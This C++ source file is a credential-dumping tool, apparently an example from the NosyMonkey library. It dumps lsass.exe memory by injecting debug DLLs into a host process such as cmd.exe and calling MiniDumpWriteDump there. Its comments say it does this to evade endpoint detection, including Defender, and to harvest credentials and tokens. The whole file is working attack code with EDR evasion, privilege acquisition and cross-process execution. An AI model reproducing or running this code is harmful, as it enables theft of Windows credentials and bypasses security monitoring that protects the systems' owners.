#include "debug.hpp"
#include "../../include/nosymonkey.hpp"

void usage(char *arg1)
{
    string sExec(arg1);
    sExec = sExec.substr(sExec.find_last_of('\\')+1);
    cout << "Dump any process by execution redirection." << endl << endl;
    cout << "By Alex Popovici, part of NosyMonkey's examples (@alex91dotar) github.com/alex91ar" << endl;
    cout << "----------------------------------------------------------------------------------" << endl << endl;
    cout << sExec << " [host process] [target process] [dump file]" << endl << endl;
    cout << "Use cmd.exe as host process. Other single-threaded processes might work as well!" << endl << endl;
    ExitProcess(1);
}

/*
This is a cool example of what we can do with Nosymonkey. lsass.exe's memory has credentials, tokens and other yummy stuff for hackers like me.
Main problem is that EDRs detect whenever someone tries to dump LSASS and stops it (go ahead and try it, open task manager, right click on lsass.exe and dump its memory)

This dumper uses Nosymonkey to load dbgcore.dll and dbghelp.dll into another process, and then calls MiniDumpWriteDump on that process.
This fools EDRs (at least Defender) into allowing the dump.

Remember to run this as an Administrator, otherwise it won't work.
*/

bool loadDlls()
{
    HMODULE dll1 = LoadLibrary("dbgcore.dll");
    HMODULE dll2 = LoadLibrary("dbghelp.dll");
    if(dll1 && dll2) return true;
    else return false;
}

int main(int argc, char **argv)
{
    if(argc != 4) usage(argv[0]);
    setCopyDepth(0); //No local calls, no need for depth.
    HANDLE hFile = CreateFile(argv[3], GENERIC_WRITE, FILE_SHARE_WRITE|FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    uintptr_t miniDumpWriteDump = (uintptr_t) GetProcAddress(LoadLibrary("dbghelp.dll"), "MiniDumpWriteDump");
    if(hFile != INVALID_HANDLE_VALUE)
    {
        DWORD dwPid = getProcessId(argv[1]);
        DWORD dwLsass = getProcessId(argv[2]);
        if(dwPid && dwLsass)
        {
            if(givePrivs(dwPid) && givePrivs(GetCurrentProcessId()))
            {
                HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, false, dwLsass);
                uintptr_t remoteHand = dupHandle(dwPid, hLsass);
                uintptr_t remoteFil = dupHandle(dwPid, hFile);
                if(remoteHand && remoteFil)
                {
                    uintptr_t GLEval = 0;
                    uintptr_t retval = copyAndExecWithParams(dwPid, loadDlls, &GLEval, {});
                    cout << (hex) << "LoadDLLs() = 0x" << retval << ". GLE = 0x" << GLEval << endl;
                    if(retval)
                    {
                        retval = execWithParams(dwPid, miniDumpWriteDump, &GLEval, {remoteHand, (uintptr_t) dwLsass, remoteFil, 2, 0, 0, 0});
                        cout << (hex) << "MiniDumpWriteDump() = 0x" << retval << ". GLE = 0x" << GLEval << endl;
                        while(true)
                        {
                            cout << "Waiting for the file handle to close..." << endl;
                            uintptr_t closeHandle = (uintptr_t) GetProcAddress(LoadLibrary("kernel32.dll"), "CloseHandle");
                            retval = execWithParams(dwPid, closeHandle, &GLEval, {remoteFil});
                            if(retval) break;
                            Sleep(1000);
                        }
                        cout << "Your dump should be in " << argv[3] << endl;
                    }
                }
                debugcry("dupHandle");
            }
            else cout << "Could not get SeDebugPrivilege for processes." << endl;
        }
        else cout << "Processes " << argv[1] << " or " << argv[2] << " not found." << endl;
    }
    debugcry("CreateFile");
    return 0;
}
